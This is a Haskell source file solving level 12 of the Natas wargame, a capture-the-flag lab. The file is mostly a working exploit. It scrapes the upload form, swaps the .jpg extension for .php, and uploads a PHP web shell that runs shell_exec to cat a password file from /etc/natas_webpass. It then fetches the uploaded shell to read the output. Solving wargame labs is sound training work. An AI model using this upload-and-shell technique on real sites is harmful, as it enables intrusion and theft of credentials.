{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas12 where

import           Data.Text             (Text)
import qualified Data.Text             as T
import qualified Data.Text.IO          as TIO
import           Safe                  (headMay)

import           Network.Wreq          (Part, partFile, partText)
import           System.FilePath.Posix ((</>))
import           Text.HTML.TagSoup     (Tag, fromAttrib, isTagOpenName,
                                        parseTags)

import           Natas.Natas

solution :: Solution
solution = do
  payload <- getPayload
  uri <- getUploadUri payload
  traverse getPassword uri

getPayload :: IO [Part]
getPayload = do
  writePayload
  req <- getLevel 12
  let body = reqBody req
      parsedForm = (fmap tagToPartPhp . parseInputForm) body
      phpPart = partFile "uploadedfile" (phpFileDir </> phpFilePath)
      payload = phpPart : parsedForm
  return payload

getUploadUri :: [Part] -> IO (Maybe Text)
getUploadUri payload = do
  req <- postLevel 12 payload
  let body = reqBody req
  pure $ headMay (parseUriHrefs body)

getPassword :: Text -> IO Text
getPassword uri = do
  req <- getLevel' 12 (concat [parentUri 12, "/", T.unpack uri]) id
  let body = reqBody req
      match = T.strip body
  pure match

parseUriHrefs :: Text -> [Text]
parseUriHrefs = fmap (fromAttrib "href") . filter (and . formables) . parseTags
  where
    formables = sequenceA [isTagOpenName "a", (/= "") . fromAttrib "href"]

parseInputForm :: Text -> [Tag Text]
parseInputForm = filter (and . formables) . parseTags
  where
    formables =
      sequenceA
        [ isTagOpenName "input"
        , (/= "") . fromAttrib "value"
        , (/= "") . fromAttrib "name"
        ]

tagToPart :: Tag Text -> Part
tagToPart = tagToPart' partText

tagToPart' :: (Text -> Text -> Part) -> Tag Text -> Part
tagToPart' converter = converter <$> fromAttrib "name" <*> fromAttrib "value"

tagToPartPhp :: Tag Text -> Part
tagToPartPhp = tagToPart' converter
  where
    converter name value
      | name == "filename" = partText name (T.replace ".jpg" ".php" value)
      | otherwise = partText name value

phpFileDir :: FilePath
phpFileDir = "php"

phpFilePath :: FilePath
phpFilePath = "natas12.php"

phpContents :: Text
phpContents = "<?php echo shell_exec('cat /etc/natas_webpass/natas13'); ?>"

writePayload :: IO ()
writePayload = TIO.writeFile (phpFileDir </> phpFilePath) phpContents
